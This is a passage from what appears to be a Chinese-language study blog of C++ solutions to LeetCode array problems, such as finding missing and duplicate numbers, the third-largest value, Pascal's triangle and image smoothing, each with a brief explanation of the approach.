class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findShortestSubArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;&gt; mp;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-comment">// mp.count()返回一个整数，表示在映射中具有该键的元素的数量。如果该键存在，则返回 1；否则返回 0。</span><br>            <span class="hljs-keyword">if</span> (mp.<span class="hljs-built_in">count</span>(nums[i])) &#123;<br>                mp[nums[i]][<span class="hljs-number">0</span>]++;<br>                mp[nums[i]][<span class="hljs-number">2</span>] = i;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                mp[nums[i]] = &#123;<span class="hljs-number">1</span>, i, i&#125;;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">int</span> maxNum = <span class="hljs-number">0</span>, minLen = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; [_, vec] : mp) &#123;<br>            <span class="hljs-keyword">if</span> (maxNum &lt; vec[<span class="hljs-number">0</span>]) &#123;<br>                maxNum = vec[<span class="hljs-number">0</span>];<br>                minLen = vec[<span class="hljs-number">2</span>] - vec[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (maxNum == vec[<span class="hljs-number">0</span>]) &#123;<br>                <span class="hljs-keyword">if</span> (minLen &gt; vec[<span class="hljs-number">2</span>] - vec[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>) &#123;<br>                    minLen = vec[<span class="hljs-number">2</span>] - vec[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> minLen;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="找到所有数组中消失的数字">找到所有数组中消失的数字</h2><blockquote><p>把数组本身用作哈希表来标记哪些数字出现过。由于 nums 的数字范围均在[1,n]中，我们可以利用这一范围<strong>之外</strong>的数字，来表达「是否存在」的含义。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findDisappearedNumbers</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> index = <span class="hljs-built_in">abs</span>(nums[i]) - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (nums[index] &gt; <span class="hljs-number">0</span>) &#123;<br>                nums[index] = -nums[index];<br>            &#125;<br>        &#125;<br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                res.<span class="hljs-built_in">push_back</span>(i + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="数组中重复的数据">数组中重复的数据</h2><blockquote><p>法一：利用数组本身来记录元素出现的次数，通过加上 <code>n</code>来标记元素出现次数。最后，再次遍历数组，找出那些超过两次出现的元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findDuplicates</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-comment">// 先减1再取模</span><br>            <span class="hljs-type">int</span> index = (nums[i] - <span class="hljs-number">1</span>) % n;<br>            nums[index] += n;<br>        &#125;<br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] &gt; <span class="hljs-number">2</span> * n) &#123;<br>                res.<span class="hljs-built_in">push_back</span>(i + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：给 <code>nums[i]</code> 加上「负号」表示数 <code>i+1</code>已经出现过一次。具体地，我们首先对数组进行一次遍历。当遍历到位置<code>i</code>时，我们考虑 <code>nums[nums[i]−1]</code> 的正负性。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findDuplicates</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        vector&lt;<span class="hljs-type">int</span>&gt; ans;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> x = <span class="hljs-built_in">abs</span>(nums[i]);<br>            <span class="hljs-keyword">if</span> (nums[x - <span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>                nums[x - <span class="hljs-number">1</span>] = -nums[x - <span class="hljs-number">1</span>];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(x);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="缺失的第一个正数">缺失的第一个正数</h2><blockquote><p>对于一个长度为 N的数组，其中没有出现的最小正整数只能在[1,N+1]中。我们对数组进行遍历，对于遍历到的数x，如果它在[1,N]的范围内，那么就将数组中的第 x−1 个位置（注意：数组下标从 0开始）打上「标记」。在遍历结束之后，如果所有的位置都被打上了标记，那么答案是N+1，否则答案是最小的没有打上标记的位置加1。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">firstMissingPositive</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-comment">// 遍历数组，把所有小于等于0或者大于numsSize的数置为numsSize+1</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] &lt;= <span class="hljs-number">0</span> || nums[i] &gt; n) &#123;<br>                nums[i] = n + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 再次遍历数组，利用数组索引和数组值的关系，标记出现过的正数</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> num = <span class="hljs-built_in">abs</span>(nums[i]);<br>            <span class="hljs-keyword">if</span> (num &lt;= n) &#123;<br>                nums[num - <span class="hljs-number">1</span>] = -<span class="hljs-built_in">abs</span>(nums[num - <span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 再次遍历数组，第一个正数的位置+1就是缺失的最小正数</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> n + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="数组的遍历">4. 数组的遍历</h1><h2 id="最大连续1的个数">最大连续1的个数</h2><blockquote><p>如果当前元素是 1，则将当前的连续 1 的个数加 1，否则，使用之前的连续 1的个数更新最大的连续 1 的个数，并将当前的连续 1的个数清零。注意：遍历数组结束之后，需要再次使用当前的连续 1的个数更新最大的连续 1 的个数，因为数组的最后一个元素可能是1，且最长连续 1的子数组可能出现在数组的末尾，如果遍历数组结束之后不更新最大的连续 1的个数，则会导致结果错误。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMaxConsecutiveOnes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> maxCount = <span class="hljs-number">0</span>, count = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i]) &#123;<br>                count++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                maxCount = <span class="hljs-built_in">max</span>(maxCount, count);<br>                count = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        maxCount = <span class="hljs-built_in">max</span>(maxCount, count);<br>        <span class="hljs-keyword">return</span> maxCount;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="提莫攻击">提莫攻击</h2><blockquote><p>法一：通过迭代给定的时间序列，计算毒药攻击的总持续时间，同时处理攻击时间的重叠情况。每次攻击发生时判断是否处于中毒状态，从而进行不同的处理。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findPoisonedDuration</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; timeSeries, <span class="hljs-type">int</span> duration)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> expired = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; timeSeries.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>            <span class="hljs-keyword">if</span> (timeSeries[i] &gt;= expired) &#123;<br>                ans += duration;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ans = ans - (expired - timeSeries[i]) + duration;<br>            &#125;<br>            expired = timeSeries[i] + duration;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：最后一次攻击持续时间为duration，之前的每一次攻击取时间间隔和duration的最小值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findPoisonedDuration</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; timeSeries, <span class="hljs-type">int</span> duration)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = duration;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; timeSeries.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            ans += <span class="hljs-built_in">fmin</span>(duration, timeSeries[i] - timeSeries[i - <span class="hljs-number">1</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="第三大的数">第三大的数</h2><blockquote><p>使用三个变量 <code>max1</code>, <code>max2</code>, 和<code>max3</code>分别表示当前数组中的最大值、第二大值和第三大值。通过遍历数组，依次更新这三个变量。在更新过程中，跳过重复元素，以确保不会将重复的值考虑在内。最终返回第三大值或者最大值（如果数组中不存在第三大值）。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">thirdMax</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> max1 = LLONG_MIN, max2 = LLONG_MIN, max3 = LLONG_MIN;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] == max1 || nums[i] == max2 || nums[i] == max3) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (nums[i] &gt; max1) &#123;<br>                max3 = max2;<br>                max2 = max1;<br>                max1 = nums[i];<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[i] &gt; max2) &#123;<br>                max3 = max2;<br>                max2 = nums[i];<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[i] &gt; max3) &#123;<br>                max3 = nums[i];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (max3 != LLONG_MIN) &#123;<br>            <span class="hljs-keyword">return</span> max3;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> max1;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="三个数的最大乘积">三个数的最大乘积</h2><blockquote><p>法一：线性扫描。如果数组中全是非负数，则排序后最大的三个数相乘即为最大乘积；如果全是非正数，则最大的三个数相乘同样也为最大乘积。如果数组中有正数有负数，则最大乘积既可能是三个最大正数的乘积，也可能是两个最小负数（即绝对值最大）与最大正数的乘积。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maximumProduct</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> max1 = INT_MIN, max2 = INT_MIN, max3 = INT_MIN;<br>        <span class="hljs-type">int</span> min1 = INT_MAX, min2 = INT_MAX;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (nums[i] &gt; max1) &#123;<br>                max3 = max2;<br>                max2 = max1;<br>                max1 = nums[i];<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[i] &gt; max2) &#123;<br>                max3 = max2;<br>                max2 = nums[i];<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[i] &gt; max3) &#123;<br>                max3 = nums[i];<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (nums[i] &lt; min1) &#123;<br>                min2 = min1;<br>                min1 = nums[i];<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[i] &lt; min2) &#123;<br>                min2 = nums[i];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">fmax</span>(max1 * max2 * max3, min1 * min2 * max1);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：排序。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maximumProduct</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(nums[<span class="hljs-number">0</span>] * nums[<span class="hljs-number">1</span>] * nums[n - <span class="hljs-number">1</span>], nums[n - <span class="hljs-number">3</span>] * nums[n - <span class="hljs-number">2</span>] * nums[n - <span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二维数组及滚动数组">5. 二维数组及滚动数组</h1><h2 id="杨辉三角">杨辉三角</h2><blockquote><p>状态转移方程为：<code>dp[i][j] = dp[i - 1][j - 1] + dp[i - 1][j]</code>。注意：需要单独处理每行第一个和最后一个元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">generate</span>(<span class="hljs-type">int</span> numRows) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">ret</span>(numRows);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numRows; ++i) &#123;<br>            ret[i].<span class="hljs-built_in">resize</span>(i + <span class="hljs-number">1</span>);<br>            ret[i][<span class="hljs-number">0</span>] = ret[i][i] = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; ++j) &#123;<br>                ret[i][j] = ret[i - <span class="hljs-number">1</span>][j] + ret[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="杨辉三角ii">杨辉三角II</h2><blockquote><p>同上题，仅返回最后一行数据。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">getRow</span><span class="hljs-params">(<span class="hljs-type">int</span> rowIndex)</span> </span>&#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">ret</span>(rowIndex+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rowIndex+<span class="hljs-number">1</span>; ++i) &#123;<br>            ret[i].<span class="hljs-built_in">resize</span>(i + <span class="hljs-number">1</span>);<br>            ret[i][<span class="hljs-number">0</span>] = ret[i][i] = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; ++j) &#123;<br>                ret[i][j] = ret[i - <span class="hljs-number">1</span>][j] + ret[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret[rowIndex];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="图片平滑器">图片平滑器</h2><blockquote><p>四重循环进行遍历</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">imageSmoother</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; img) &#123;<br>        <span class="hljs-type">int</span> m = img.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = img[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">res</span>(m, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, i - <span class="hljs-number">1</span>); k &lt; <span class="hljs-built_in">min</span>(m, i + <span class="hljs-number">2</span>); k++) &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, j - <span class="hljs-number">1</span>); l &lt; <span class="hljs-built_in">min</span>(n, j + <span class="hljs-number">2</span>); l++) &#123;<br>                        sum += img[k][l];<br>                        count++;<br>                    &#125;<br>                &#125;<br>                res[i][j] = sum / count;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="区域加法ii">区域加法II</h2><blockquote><p>只需要求出 a 和 b 中的最小值，类似于数学中求交集的操作。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td 